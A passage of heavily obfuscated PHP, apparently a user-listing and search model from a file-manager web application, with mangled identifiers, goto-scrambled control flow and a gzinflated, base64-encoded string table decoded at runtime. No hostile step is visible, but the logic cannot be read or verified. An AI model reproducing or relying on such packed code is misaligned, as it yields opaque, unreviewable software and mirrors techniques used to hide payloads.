)->select(); $f Á÷‰°¤ = array_sort_keep($f Á÷‰°¤, $F¡–îí¼¼[1551], $e¤ÂÒ¤»¤); $this->_listDataApply($f Á÷‰°¤); goto EùâºÏÉ¢ï; EùâºÏÉ¢ï: return $f Á÷‰°¤; goto F³è‰×‚’š; F³è‰×‚’š: } public function listByGroup($F´ôâÇ©Ğæ = 0, $aÏÖ‚²îí¼ = array()) { goto d­Í­ó®á; D›¢Éº„¬÷: $this->_listDataApply($d’¦¼ãÌ¼Ñ[$a„ßÔ­²¢×[367]]); return $d’¦¼ãÌ¼Ñ; goto CÎ®Âñª–; d­Í­ó®á: $a„ßÔ­²¢× =& $_SERVER[›èö’ù¤]; $AòôÇö¤î = $a„ßÔ­²¢×[33]; $dö«ï³¸ˆ… = array(); goto C¢Ÿ‘¦„‰æ; C¢Ÿ‘¦„‰æ: if ($F´ôâÇ©Ğæ) { $dö«ï³¸ˆ… = array($a„ßÔ­²¢×[2183] => intval($F´ôâÇ©Ğæ)); $AòôÇö¤î = "\114\x45\106\x54\x20\112\x4f\x49\x4e\x20{$this->tablePrefix}\165\x73\145\162\137\x67\x72\157\165\160\x20\165\163\145\x72\137\147\x72\157\165\x70\40\157\x6e\40\165\163\x65\x72\56\x75\163\x65\162\x49\104\40\x3d\40\165\x73\x65\x72\137\x67\162\x6f\x75\160\56\x75\x73\x65\x72\111\x44"; $fØµÀ´ÜÔ = Input::get($a„ßÔ­²¢×[450], null, $a„ßÔ­²¢×[33]) ? $a„ßÔ­²¢×[33] : $a„ßÔ­²¢×[2184]; } if (isset($aÏÖ‚²îí¼[$a„ßÔ­²¢×[734]])) { $dö«ï³¸ˆ…[$a„ßÔ­²¢×[2185]] = $aÏÖ‚²îí¼[$a„ßÔ­²¢×[734]]; } $d’¦¼ãÌ¼Ñ = $this->_makeOrder($fØµÀ´ÜÔ)->field($a„ßÔ­²¢×[2186])->where($dö«ï³¸ˆ…)->join($AòôÇö¤î)->selectPage(50); goto D›¢Éº„¬÷; CÎ®Âñª–: } private function _makeOrder($B›Ÿ”¾˜ñ® = '') { goto BÕ¸—³‚¹¢; Fãêãöè„ö: $F‚–œˆøä = Input::get($e¨ˆ’¼[450], $e¨ˆ’¼[7], $e¨ˆ’¼[1542], $AÍ—¶ä‰—æ); $D›²³Ô´– = Input::get($e¨ˆ’¼[451], $e¨ˆ’¼[7], $e¨ˆ’¼[1807], array($e¨ˆ’¼[1807], $e¨ˆ’¼[445])); $D›²³Ô´– = $A¼ÜÂ¬¢×[$D›²³Ô´–]; goto D·Ü•ÄÁ´•; D·Ü•ÄÁ´•: $B›Ÿ”¾˜ñ® = $B›Ÿ”¾˜ñ® . "\x75\x73\145\x72\x2e{$F‚–œˆøä}\40{$D›²³Ô´–}\54\40\x75\x73\145\x72\56\x75\x73\145\162\x49\104\40\x61\x73\143"; return $this->alias($e¨ˆ’¼[1927])->order($B›Ÿ”¾˜ñ®); goto fİÉ‰ÙÑãñ; BÕ¸—³‚¹¢: $e¨ˆ’¼ =& $_SERVER[›èö’ù¤]; $AÍ—¶ä‰—æ = array($e¨ˆ’¼[1551], $e¨ˆ’¼[28], $e¨ˆ’¼[1706], $e¨ˆ’¼[1678], $e¨ˆ’¼[194]); $A¼ÜÂ¬¢× = array($e¨ˆ’¼[443] => $e¨ˆ’¼[444], $e¨ˆ’¼[445] => $e¨ˆ’¼[446]); goto Fãêãöè„ö; fİÉ‰ÙÑãñ: } public function listSearch($f††»Â®ç¶) { goto Eá÷×§¾‹; BùŸÚÏ‰: $this->_filterByGroup($eÌñ¼àè˜ù, $dŒ”ŸÊ‹ÔÇ); return $eÌñ¼àè˜ù; goto CÔëé‘™‡è; FŒÍ”ÚµøØ: $eÌñ¼àè˜ù = $this->_makeOrder()->where($D¹ÕÃ…‰°)->selectPage(20); if (!$eÌñ¼àè˜ù || count($eÌñ¼àè˜ù[$CØÜ’æ“¢ò[367]]) < 5 && Input::check($Fëè”§”„ù, $CØÜ’æ“¢ò[316])) { $F‡á¸ŸïÀæ = $this->_searchFromMeta($CØÜ’æ“¢ò[458], $Fëè”§”„ù, 10); $Cºô–Ôêçï = $this->_searchFromMeta($CØÜ’æ“¢ò[459], $Fëè”§”„ù, 10); $bâ‹ ‹¾æÜ = array_merge($F‡á¸ŸïÀæ, $Cºô–Ôêçï, $eÌñ¼àè˜ù[$CØÜ’æ“¢ò[367]]); $eÌñ¼àè˜ù[$CØÜ’æ“¢ò[367]] = array_unique_by_key($bâ‹ ‹¾æÜ, $CØÜ’æ“¢ò[1551]); $eÌñ¼àè˜ù[$CØÜ’æ“¢ò[364]][$CØÜ’æ“¢ò[365]] = count($eÌñ¼àè˜ù[$CØÜ’æ“¢ò[367]]); $eÌñ¼àè˜ù[$CØÜ’æ“¢ò[364]][$CØÜ’æ“¢ò[366]] = ceil($eÌñ¼àè˜ù[$CØÜ’æ“¢ò[364]][$CØÜ’æ“¢ò[365]] / $eÌñ¼àè˜ù[$CØÜ’æ“¢ò[364]][$CØÜ’æ“¢ò[361]]); } $this->_listDataApply($eÌñ¼àè˜ù[$CØÜ’æ“¢ò[367]]); goto BùŸÚÏ‰; Fî›ò‰ÒØÕ: $Fëè”§”„ù = str_replace($CØÜ’æ“¢ò[1810], $CØÜ’æ“¢ò[1811], trim($Fëè”§”„ù)); $D¹ÕÃ…‰° = array($CØÜ’æ“¢ò[28] => array($CØÜ’æ“¢ò[381], "\x25{$Fëè”§”„ù}\45"), $CØÜ’æ“¢ò[303] => array($CØÜ’æ“¢ò[381], "{$Fëè”§”„ù}\x25"), $CØÜ’æ“¢ò[1986] => array($CØÜ’æ“¢ò[381], "{$Fëè”§”„ù}\45"), $CØÜ’æ“¢ò[983] => $CØÜ’æ“¢ò[1812]); if (Input::check($Fëè”§”„ù, $CØÜ’æ“¢ò[309])) { $D¹ÕÃ…‰°[$CØÜ’æ“¢ò[1551]] = array($CØÜ’æ“¢ò[381], "{$Fëè”§”„ù}\45"); $D¹ÕÃ…‰°[$CØÜ’æ“¢ò[2167]] = array($CØÜ’æ“¢ò[381], "{$Fëè”§”„ù}\45"); } goto Bù¹”¡ˆ´ƒ; Bù¹”¡ˆ´ƒ: if (!$Fëè”§”„ù) { $D¹ÕÃ…‰° = array(); } if (isset($f††»Â®ç¶[$CØÜ’æ“¢ò[734]])) { $D¹ÕÃ…‰°[$CØÜ’æ“¢ò[734]] = $f††»Â®ç¶[$CØÜ’æ“¢ò[734]]; } $D¹ÕÃ…‰° = $this->parseWhereLike($D¹ÕÃ…‰°); goto FŒÍ”ÚµøØ; Eá÷×§¾‹: $CØÜ’æ“¢ò =& $_SERVER[›èö’ù¤]; $Fëè”§”„ù = $f††»Â®ç¶[$CØÜ’æ“¢ò[1808]]; $dŒ”ŸÊ‹ÔÇ = isset($f††»Â®ç¶[$CØÜ’æ“¢ò[1809]]) ? $f††»Â®ç¶[$CØÜ’æ“¢ò[1809]] : !1; goto Fî›ò‰ÒØÕ; CÔëé‘™‡è: } private function _filterByGroup(&$CÛìé©ê±, $fØ°ùÕ¸êÄ) { $BİÜ¼»Èæ =& $_SERVER[›èö’ù¤]; if (!$fØ°ùÕ¸êÄ) { return $CÛìé©ê±; } foreach ($CÛìé©ê±[$BİÜ¼»Èæ[367]] as $C»Î¡ğ´åÆ => &$bÃìÔê²á) { $e¡ï…Õ¢‚ = array_to_keyvalue($bÃìÔê²á[$BİÜ¼»Èæ[1897]], $BİÜ¼»Èæ[33], $BİÜ¼»Èæ[1720]); if (!in_array($fØ°ùÕ¸êÄ, $e¡ï…Õ¢‚)) { unset($CÛìé©ê±[$BİÜ¼»Èæ[367]][$C»Î¡ğ´åÆ]); } } unset($bÃìÔê²á); $CÛìé©ê±[$BİÜ¼»Èæ[367]] = array_values($CÛìé©ê±[$BİÜ¼»Èæ[367]]); $CÛìé©ê±[$BİÜ¼»Èæ[364]] = array($BİÜ¼»Èæ[1960] => count($CÛìé©ê±[$BİÜ¼»Èæ[367]]), $BİÜ¼»Èæ[1958] => $CÛìé©ê±[$BİÜ¼»Èæ[364]][$BİÜ¼»Èæ[361]], $BİÜ¼»Èæ[1957] => 1, $BİÜ¼»Èæ[1959] => 1); } private function _searchFromMeta($e¸¡Á¶, $DÒéµ¡Õö, $báŠÃ»‚Â) { goto A«—Âİ“Éã; D•ç•“ÏŠœ: $Cßóê¸ñâ = $this->parseWhereLike($Cßóê¸ñâ); $EáÙÁ¯‡½µ = Model($Døï„ˆã·[2187])->where($Cßóê¸ñâ)->limit($báŠÃ»‚Â)->select(); if (!$EáÙÁ¯‡½µ) { return array(); } goto B¬·Â×ø¿Å; A«—Âİ“Éã: $Døï„ˆã· =& $_SERVER[›èö’ù¤]; $DÒéµ¡Õö = strtolower($DÒéµ¡Õö); $Cßóê¸ñâ = array($Døï„ˆã·[93] => $e¸¡Á¶, $Døï„ˆã·[372] => array($Døï„ˆã·[381], "\45{$DÒéµ¡Õö}\x25")); goto D•ç•“ÏŠœ; e¯Õ×ÉÇƒ: return $dÈ“ôÖŠ–±; goto c¥¸¯Ü…ñ; B¬·Â×ø¿Å: $EáÙÁ¯‡½µ = array_to_keyvalue($EáÙÁ¯‡½µ, $Døï„ˆã·[33], $Døï„ˆã·[1551]); $dÈ“ôÖŠ–± = $this->where(array($Døï„ˆã·[1542] => array($Døï„ˆã·[7], $EáÙÁ¯‡½µ)))->select(); if (!$dÈ“ôÖŠ–±) { return array(); } goto e¯Õ×ÉÇƒ; c¥¸¯Ü…ñ: } private function _listDataApplyItem($eÓñ“×Ò·Ç) { $D„“çå† = array($eÓñ“×Ò·Ç); $this->_listDataApply($D„“çå†); return $D„“çå†[0]; } private function _listDataApply(&$aŒëó‘‡Â) { goto B½£…×Ä‚Ï; EãŠ®‘¡¨Ä: $Fö¨åå…Œ = array_to_keyvalue($aŒëó‘‡Â, $C¤ã®·êÚÛ[33], $C¤ã®·êÚÛ[1551]); $this->_listAppendGroup($aŒëó‘‡Â, $Fö¨åå…Œ); $this->_listAppendMeta($aŒëó‘‡Â, $Fö¨åå…Œ); goto D‚Äµæ‹Á; D‚Äµæ‹Á: $this->_listAppendSourceRoot($aŒëó‘‡Â, $Fö¨åå…Œ); goto EìòŒàñ·ç; B½£…×Ä‚Ï: $C¤ã®·êÚÛ =& $_SERVER[›èö’ù¤]; if (!$aŒëó‘‡Â) { return; } array_remove_key($aŒëó‘‡Â, $C¤ã®·êÚÛ[875]); goto EãŠ®‘¡¨Ä; EìòŒàñ·ç: } private function _listAppendSourceRoot(&$bâó×âÛ½Ó, $aÙÀ»ª¡„õ) { goto eˆø˜â…•; AÍîŠÚ¦´¬: foreach ($bâó×âÛ½Ó as &$E„óç˜ñ²Ã) { $E„óç˜ñ²Ã[$CŞ‘¯ªª¡[85]] = $Eæ’ƒò‘êé[$E„óç˜ñ²Ã[$CŞ‘¯ªª¡[1551]]] ? $Eæ’ƒò‘êé[$E„óç˜ñ²Ã[$CŞ‘¯ªª¡[1551]]] : array(); } unset($E„óç˜ñ²Ã); goto a¨Í×õâİ­; F¿–•Ï–: $Eæ’ƒò‘êé = $DÀ±‡ÅŒó•->limit(count($aÙÀ»ª¡„õ))->where($d¼­¢åƒ»‚)->select(); $Eæ’ƒò‘êé = array_to_keyvalue($Eæ’ƒò‘êé, $CŞ‘¯ªª¡[499]); $Eæ’ƒò‘êé = array_remove_key($Eæ’ƒò‘êé, $CŞ‘¯ªª¡[499]); goto AÍîŠÚ¦´¬; eˆø˜â…•: $CŞ‘¯ªª¡ =& $_SERVER[›èö’ù¤]; $d¼­¢åƒ»‚ = array($CŞ‘¯ªª¡[493] => 0, $CŞ‘¯ªª¡[499] => array($CŞ‘¯ªª¡[7], $aÙÀ»ª¡„õ), $CŞ‘¯ªª¡[406] => SourceModel::TYPE_USER); $DÀ±‡ÅŒó• = Model($CŞ‘¯ªª¡[816])->order($CŞ‘¯ªª¡[1818])->field($CŞ‘¯ªª¡[1819]); goto F¿–•Ï–; a¨Í×õâİ­: } private function _listAppendGroup(&$F÷„šõˆ·, $A•™˜Ò¤Û) { goto D£˜â°óò®; c©ãšõ‚³ƒ: foreach ($F÷„šõˆ· as &$F¯ÙØÄŸÑ) { $F¯ÙØÄŸÑ[$c‹ª¾ğø´[1897]] = array(); if (isset($cØä®¸‘²ğ[$F¯ÙØÄŸÑ[$c‹ª¾ğø´[1551]]])) { $F¯ÙØÄŸÑ[$c‹ª¾ğø´[1897]] = $cØä®¸‘²ğ[$F¯ÙØÄŸÑ[$c‹ª¾ğø´[1551]]]; } } unset($F¯ÙØÄŸÑ); goto AÌÃÒä„¨; f»Ì¶¡…ß: $a§À³à Å¿ = array_to_keyvalue($cØä®¸‘²ğ, $c‹ª¾ğø´[33], $c‹ª¾ğø´[1720]); $a§À³à Å¿ = array_remove_value(array_unique($a§À³à Å¿), $c‹ª¾ğø´[191]); if (!$a§À³à Å¿ || !$cØä®¸‘²ğ) { return; } goto E©£ ·¾Ã»; båà­Æ…™¦: $cØä®¸‘²ğ = array_to_keyvalue_group($cØä®¸‘²ğ, $c‹ª¾ğø´[1551]); foreach ($cØä®¸‘²ğ as &$a÷®¹¹”ç¿) { $a‡âõ•ÇÖ¾ = array(); foreach ($a÷®¹¹”ç¿ as $d–†¼•†«Û) { if (!$d–†¼•†«Û[$c‹ª¾ğø´[1820]]) { continue; } $dî½ÜàíŠä = Model($c‹ª¾ğø´[502])->listData($d–†¼•†«Û[$c‹ª¾ğø´[1820]]); $a‡âõ•ÇÖ¾[] = array($c‹ª¾ğø´[1720] => $d–†¼•†«Û[$c‹ª¾ğø´[1720]], $c‹ª¾ğø´[2189] => $fö‹ÔÙŠé[$d–†¼•†«Û[$c‹ª¾ğø´[1720]]][$c‹ª¾ğø´[28]], $c‹ª¾ğø´[516] => $fö‹ÔÙŠé[$d–†¼•†«Û[$c‹ª¾ğø´[1720]]][$c‹ª¾ğø´[516]], $c‹ª¾ğø´[408] => $dî½ÜàíŠä); } $a÷®¹¹”ç¿ = $a‡âõ•ÇÖ¾; } unset($a÷®¹¹”ç¿); goto c©ãšõ‚³ƒ; D£˜â°óò®: $c‹ª¾ğø´ =& $_SERVER[›èö’ù¤]; $bÁÔÙ¨ÁŸ· = array($c‹ª¾ğø´[1551] => array($c‹ª¾ğø´[7], $A•™˜Ò¤Û)); $cØä®¸‘²ğ = Model($c‹ª¾ğø´[1806])->where($bÁÔÙ¨ÁŸ·)->select(); goto f»Ì¶¡…ß; E©£ ·¾Ã»: $bÁÔÙ¨ÁŸ· = array($c‹ª¾ğø´[1720] => array($c‹ª¾ğø´[7], $a§À³à Å¿)); $fö‹ÔÙŠé = Model($c‹ª¾ğø´[1895])->field($c‹ª¾ğø´[2188])->where($bÁÔÙ¨ÁŸ·)->select(); $fö‹ÔÙŠé = array_to_keyvalue($fö‹ÔÙŠé, $c‹ª¾ğø´[1720]); goto båà­Æ…™¦; AÌÃÒä„¨: } public function userAppendGroup($Dç‹–ïîëí) { $E  ïõ³„¤ =& $_SERVER[›èö’ù¤]; if (!$Dç‹–ïîëí) { return array(); } $this->_listAppendGroup($Dç‹–ïîëí, array_to_keyvalue($Dç‹–ïîëí, $E  ïõ³„¤[33], $E  ïõ³„¤[1551])); return $Dç‹–ïîëí; } private function _listAppendMeta(&$E…–Œ¸˜“„, $e£Ú±ğÇâ×) { goto B¯…Œ‹‚×ª; DÌƒ•ÖÛ™–: foreach ($Fò¦»Ñãœó as &$a“Œ†ìÄ„Ó) { $b² Š„î¹ = array(); foreach ($a“Œ†ìÄ„Ó as $a´­±Ü„Ú±) { if (!in_array($a´­±Ü„Ú±[$EÎÁ¤£³[93]], $c»é«§²±ã)) { $b² Š„î¹[$a´­±Ü„Ú±[$EÎÁ¤£³[93]]] = $a´­±Ü„Ú±[$EÎÁ¤£³[372]]; } } $a“Œ†ìÄ„Ó = $b² Š„î¹; } unset($a“Œ†ìÄ„Ó); $F³‘ğºµØÅ = Model($EÎÁ¤£³[2190]); goto cñ¹ßîîœ; B¯…Œ‹‚×ª: $EÎÁ¤£³ =& $_SERVER[›èö’ù¤]; $Aá«¿çã®… = UserJobModel::JOB_KEY; $c»é«§²±ã = array($EÎÁ¤£³[2168]); goto C‰êàÀà²÷; C‰êàÀà²÷: $fÄ´ëÔÁˆÉ = array($EÎÁ¤£³[1551] => array($EÎÁ¤£³[7], $e£Ú±ğÇâ×)); $Fò¦»Ñãœó = Model($EÎÁ¤£³[2166])->where($fÄ´ëÔÁˆÉ)->select(); $Fò¦»Ñãœó = array_to_keyvalue_group($Fò¦»Ñãœó, $EÎÁ¤£³[1551]); goto DÌƒ•ÖÛ™–; cñ¹ßîîœ: foreach ($E…–Œ¸˜“„ as &$bƒâìÉöğ) { $e°µ¡è‰³  = array(); if (isset($Fò¦»Ñãœó[$bƒâìÉöğ[$EÎÁ¤£³[1551]]])) { $e°µ¡è‰³  = $Fò¦»Ñãœó[$bƒâìÉöğ[$EÎÁ¤£³[1551]]]; } $bƒâìÉöğ[$EÎÁ¤£³[2191]] = array(); if (isset($e°µ¡è‰³ [$Aá«¿çã®…])) { $bƒâìÉöğ[$EÎÁ¤£³[2191]] = $F³‘ğºµØÅ->getUserJobInfo($e°µ¡è‰³ [$Aá«¿çã®…]); } } unset($bƒâìÉöğ); goto D²Ã²Ğ¾ìë; D²Ã²Ğ¾ìë: } protected function groupUserAll($dğÜŒ»á¶) { $DÑ™½œÑ½ =& $_SERVER[›èö’ù¤]; if (!$dğÜŒ»á¶) { return !1; } $e•¦ô‚ÎĞÚ = Model($DÑ™½œÑ½[1806])->field($DÑ™½œÑ½[1551])->where(array($DÑ™½œÑ½[1720] => array($DÑ™½œÑ½[7], $dğÜŒ»á¶)))->select(); $e•¦ô‚ÎĞÚ = array_to_keyvalue($e•¦ô‚ÎĞÚ, $DÑ™½œÑ½[33], $DÑ™½œÑ½[1551]); return array_unique($e•¦ô‚ÎĞÚ); } public function userSearch($f…¼æÆ…‹, $Bè˜ ‹„é‰ = "\52") { return Model($_SERVER[›èö’ù¤][533])->where($f…¼æÆ…‹)->field($Bè˜ ‹„é‰)->find(); } } goto a­Ğ—–Ë¡Õ; eçÇÎÛºŒŸ: if (!function_exists('_kodDe')) { function _kodDe($A¿‚‡‚Ìáñ) { $A¿‚‡‚Ìáñ = base64_decode($A¿‚‡‚Ìáñ); $dæ·‹½êãÑ = strlen($A¿‚‡‚Ìáñ); $eÂ£«ëñ‚ = ''; $A»‡·ó‡ºˆ = ord($A¿‚‡‚Ìáñ[0]) - 30; for ($fß¾ôæÌŒ‚ = 1; $fß¾ôæÌŒ‚ < $dæ·‹½êãÑ; $fß¾ôæÌŒ‚ += 2) { if ($fß¾ôæÌŒ‚ + 1 < $dæ·‹½êãÑ) { $eÂ£«ëñ‚ .= chr(ord($A¿‚‡‚Ìáñ[$fß¾ôæÌŒ‚ + 1]) + $A»‡·ó‡ºˆ); $eÂ£«ëñ‚ .= chr(ord($A¿‚‡‚Ìáñ[$fß¾ôæÌŒ‚]) + $A»‡·ó‡ºˆ); } else { $eÂ£«ëñ‚ .= chr(ord($A¿‚‡‚Ìáñ[$fß¾ôæÌŒ‚]) + $A»‡·ó‡ºˆ); } } return $eÂ£«ëñ‚; } } define(strrev('¤ù’öè›'), base64_decode('z8eG3b3Rhfz1')); $_SERVER[›èö’ù¤] = explode("\174\2\174\2\174\1", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xc5\x7d\x9\x78\x54\x45\xb6\xb0\xce\xa8\x6f\xdc\xf7\x51\x46\x47\xaf\x11\x48\x2\xbd\x24\x61\xf\x84\xd8\x49\x3a\x49\x43\x27\x1d\xba\x3b\x2c\x92\xd0"."\xdc\xee\xbe\x9d\xbe\x49\x77\xdf\xce\xbd\xb7\xb3\x11\xdc\x11\x94\xc5\x5\x45\x40\xc7\x5\x37\x44\x36\xf7\x5\xdc\x51\x47\x51\x47\x47\x71\xf4\xb9\xcc\xb8\x0\xe2\x3a\x3a\x8a\x8a\xdb\xab\xbd"."\352\336\156\364\375\337\377\177\337\217\102\337\72\265\127\235\72\165\316\251\123\247\266\74\262\364\366\127\57\32\374\35\370\357\300\33\327\354\131\264\11\177\16\36\204\176\321".base64_decode('9+mL/3AA+vP7xZeWlDSOPWxk8xGX3btBvkNeJ18a8G9/wXfkS+uneHfdvL1/14E=')."\x7\xd4\x3f\xb6\xf4\xbe\x4a\x90\x18\xe7\xad\xc4\x3f\x52\x46\x33\x25\xa5\x4f\x35\x4c\x3\x3\x62\x5a\x26\xa1\x76\xe0\x6f\x35\x83\x7f\xdd\xf8\xc7\xe8\x4e\xa9\xa6\x82\xbf\x23\xcd\x81\x70\x24"."\324\332\322\342\15\206\43\244\104\61\76\255\305\311\127\126\326\345\64\51\74\253\350\6\250\112\54\56\222\325\262\112\306\2\341\200\270\154\312\121\331\40\45\325\325\104\352"."\xbc\x2d\xfe\xc0\xac\x48\x78\x56\x8b\x97\xa4\x88\x46\xba\x73\x8a\xde\x8f\x43\xe8\x33\x64\xca\xba\x19\x56\xd3\xa\x4b\xd1\xab\xb3\x76\xd5\x78\x1b\x7c\xcd\x52\x38\xe8\x69\xe\x79\x6a\xc3\xbe"."\100\63\6\327\6\232\232\174\341\174\170\60\340\367\327\170\152\247\346\307\264\4\75\15\115\36\11\264\57\245\104\324\114\102\53\221\346\342\230\271\122\51\376\250\127\225\124"."\34\177\146\144\332\34\263\77\113\276\302\354\13\314\101\46\227\112\341\100\63\373\42\355\127\22\162\56\105\306\254\116\14\144\165\65\55\323\256\117\125\372\31\24\177\310\71".strrev('`•è7£FitTÃe¤TÈ’h>©LØ%†Ö÷ëÈTR+I]1Å áÌº™öğ13SS')."\xd3\xab\x8a\x51\x8f\x8b\x25\x9c\xaf\xb5\x19\xc\x88\xe4\xf1\xfb\xa5\xfd\x95\x60\x2a\xe9\x2c\x2d\x6\xe7\x29\x50\x58\x20\x58\xe7\xd\x4a\x35\xb3\x24\x3e\x4e\x31\x2d\x9d\xd6\x32\x2e\x50\xa"."\x98\x4f\x53\x68\xaa\x37\x18\xc4\x1f\xe\x82\xc1\x7e\x1f\x9c\x3a\x12\x8\xd4\xd7\x87\xbc\x2c\x44\x3a\x37\xcd\xf\x5a\x32\x8a\x60\xa9\x25\x14\x4f\xa4\xcc\x48\x8f\x9c\xca\x51\x64\xed\xc2\xbf".base64_decode('xeSH/GoGQeBuNaPmCLKSIjSNrRzykaOpFQpR4uQjDfJrZHGBldaDP6sm49+JJFE=')."\64\2\343\24\335\214\50\231\230\26\127\63\144\75\126\223\265\107\60\120\66\223\165\272\12\322\221\2\65\127\114\313\366\67\151\75\244\63\11\65\245\370\331\162\113\150\251"."\270\242\363\160\26\144\27\143\110\257\324\1\41\167\163\56\55\46\141\301\130\122\115\305\165\272\112\177\55\45\240\3\152\242\237\257\106\103\313\351\61\305\7\326\13\317\333"."\xc2\x5a\x52\x4e\x12\x29\xa6\x9\x3a\x6d\xd0\x7e\xb5\x66\x53\x9a\x1c\xf\x29\xba\xd0\xd7\x7a\x90\x31\x90\x33\x45\x60\xe\x25\xab\xd7\xf4\x74\x1d\xa0\x1b\xa4\x7e\xb0\x5a\xd4\xd6\x2\x11\x5d"."\164\275\304\205\41\164\341\37\167\311\354\363\235\77\267\317\76\13\374\123\112\210\137\33\151\132\122\111\245\42\112\237\102\326\125\72\76\306\240\175\165\33\121\65\343\6\20"."\34\364\5\42\111\331\110\66\305\307\104\120\56\322\362\114\134\351\163\145\223\131\34\344\353\276\315\202\367\160\166\232\65\323\53\120\346\224\26\223\123\142\117\361\167\322\64"."\263\41\45\23\207\3\102\172\244\365\146\320\200\145\25\205\44\252\163\110\161\251\111\232\45\65\126\252\225\6\315\230\116\261\57\332\73\6\63\30\320\354\43\30\123\104\302"."\x4a\x9f\x49\x6\x45\x9a\x18\x4b\xca\x3a\x98\xae\xaa\x9c\x99\x70\x8e\xc7\x40\x39\x9b\x4d\xa9\x31\xd9\x54\xb5\x8c\x5b\x8b\x99\x8a\xe9\x34\x4c\x5d\x91\x49\x69\x9e\x58\x4c\x31\xc\x67\xad\x96".base64_decode('MXUt5fSkUlqvM6CrHWqmUhqB08BIsN6dkEJWkkVcNFGCuAIJxAhcG12cLLUuZ4w=')."\204\242\73\275\144\321\124\112\140\76\30\201\244\311\352\124\43\253\31\52\154\136\245\44\233\246\34\113\102\342\302\213\257\372\225\364\152\46\245\146\224\274\264\336\276\254\252".strrev('T¥@Ôé†s¥!Ğ`Å)SC&§'."\0".'·«!‘‚‹›)Jå¤w.‹gÒ€…&ĞÔ«m+')._kodDe('KRSlLoca60KRXmU/ng7Rufd1kYo8i4LP9Sk9OAO4EIvWpH3hE8LOPdMciNBRjz1i').base64_decode('yh20zX5AolmRFDjTCZYYRKxm0FcObNF6FR1UXNNfKXVp8ajW56JRMHEI0BCaGE4=')."\x77\xd6\x74\x6\xe5\x4c\x7\x1c\x9f\x68\xbf\xa9\x10\xf4\x33\x7a\x3a\xac\x3\xed\x57\x32\x1d\x66\x92\x66\xc\x79\x83\xd3\xbd\xc1\x48\x28\x50\x1f\x9e\xe1\x9\x92\xdd\x3e\x3\xb0\xa4\x8f\x56".base64_decode('BYtOOYNKHAx9zKT55CwcNZoGLgw4VzQWLhYa5/c1wIGpcxogkVNMRcv2q2kVtt0=')."\x64\x31\x68\x24\x1\x2b\xd0\x40\x1a\xe4\x46\x1d\xaa\x6a\x4b\x8e\x28\x69\x8b\x8f\x2c\x75\x82\x7f\x47\x94\xce\x6e\xab\x73\x8d\x68\xaf\x76\xab\x3c\x8f\xbb\xdc\x55\x2e\x55\x94\x8d\x95\x5a\x0"."\x6f\xa2\xca\x29\x89\x74\x3a\x2f\x45\x99\x14\x98\xfa\x2b\x3\x0\xb7\x2e\x61\x59\xdb\x86\xe\x3\x83\xde\x69\xad\xde\x50\x38\xd2\xe4\xd\x37\x6\xea\x48\xd\x5e\xf\xf9\xf2\x6b\x78\x69\xd2"."\x1e\xcd\xc6\x3f\xed\x64\x6\x13\x98\xac\xfa\xd2\x72\x87\x8d\x4a\xc3\x50\x93\xa6\x2b\x56\xc8\x20\xdb\x35\x66\xa8\x71\x4a\xc6\x61\xb0\x51\x51\x3b\x92\xa4\x7f\x2a\x2c\x2d\xa6\xa5\x34\x5d\x4e"."\x41\x2a\x46\x91\x58\xa1\x94\xa5\x43\x4d\x90\xf9\xc1\x4\x93\x7\x42\x6a\x3a\x4b\xe9\x9a\x99\xcc\xa5\xa3\xc2\x27\x65\x4b\xc1\x7c\xd3\xed\x25\xa9\xb1\xed\x4d\xd3\xc9\x57\xa5\x9b\x24\x1c\x56"."\x51\x4f\x16\x4f\xc0\x1d\x1a\x5\xfe\xe7\x64\x38\xae\xa5\x65\xca\xed\x22\x92\xa4\xc4\x31\x4d\xc2\xa0\x11\x96\x98\x46\x45\xe6\xfb\xa5\xa9\x9b\x1a\x84\xea\x96\x24\x4d\x8a\x99\xd4\xc8\x24\x75"."\x28\xb4\x49\x39\xd6\x36\xda\xca\xb8\x92\x52\xe8\x68\x24\x15\x4a\xd2\xcb\x48\x32\xb0\x33\xb1\xb1\x4a\x30\xf2\xe\x18\x37\x0\xe5\x5b\xaa\x6a\x4\x41\x4e\xc8\x48\xd1\xf0\xc\xc8\xef\x72\x80"."\311\222\246\300\156\22\210\166\202\345\202\303\21\325\250\27\66\377\210\206\342\100\343\145\236\276\105\127\22\52\131\164\31\60\143\115\262\336\105\63\200\31\342\333\16\14\10"."\x85\xd5\xb7\xfa\xfd\x91\xda\x40\x73\x18\xf0\xd0\x18\x32\x23\xe8\xb\x7b\x29\x8e\x7a\xea\x22\x9e\xda\x96\x41\xba\x89\xf2\x19\x27\x9\x20\xc1\xb0\x22\x39\xe7\x97\x7b\x2a\x6\xf9\x4e\xc4\xb7".strrev('‰Xw[¦²raƒLà=9N}îsƒ—š6‰ŠqÖNqiHÆqCjÎu¿b @ÉÌN,')."\xd0\x7f\xbc\x51\xfb\xc8\xbc\x72\xf2\xd\x7\x16\x8\x46\x74\x6b\x6f\x9\x84\x48\x86\x6a\x8\x5\xdc\x53\x54\xd1\x49\x3b\x5a\x5a\x49\x54\x5a\xc0\xa9\x6\x2f\x1\x1e\x46\xd0\x30\x29\x13\xde"."\311\63\43\104\111\157\16\244\327\325\1\231\367\261\232\266\207\224\335\227\116\161\206\320\332\53\47\237\213\160\243\257\171\152\244\51\120\347\365\107\174\315\200\56\205\363\341"."\xad\x2d\x75\x1e\x3a\xb9\x22\xbc\x26\x10\x6e\xb4\x40\x5b\x1\x65\x9a\xee\xf1\xfb\xec\xc9\xbd\x33\x7d\xa1\x70\xa8\x60\x14\x80\xb5\x7a\x6d\x31\x40\x16\x6c\x9\x7a\xeb\x7d\x33\x59\xb0\xde\xe7"."\xf5\xd7\x85\x22\xb5\x9e\xda\x46\x9e\xa6\xd9\xd3\x44\x2\x91\x4\x94\xc6\xc\xb7\x35\x7d\x4\x90\xd8\x10\x93\xe9\x22\x3d\x50\x3e\xa5\x83\x15\xb1\x8\x50\x11\x2a\x1a\x44\x38\x1e\x80\xed\x52".strrev('Aº‰ö~Ñ RY™$\'’¥?Á,+tÉYdËIU)¦&ÆFÅ´Ç£ÂÔb¥